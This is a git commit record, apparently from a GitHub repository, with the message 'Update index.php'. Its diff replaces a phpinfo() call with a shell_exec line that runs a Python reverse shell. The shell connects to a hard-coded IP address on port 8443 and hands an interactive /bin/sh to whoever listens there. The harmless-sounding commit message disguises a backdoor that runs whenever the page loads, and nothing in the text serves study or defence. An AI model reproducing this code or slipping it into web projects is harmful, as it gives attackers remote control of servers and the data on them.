6f0a0195252d137e346df2fb82c83ccea383b6f5
abzeabze <141318253+abzeabze@users.noreply.github.com>
2026-03-27 16:19:45 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,3 @@
 <?php
 
-phpinfo();
+shell_exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("178.79.188.73",8443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
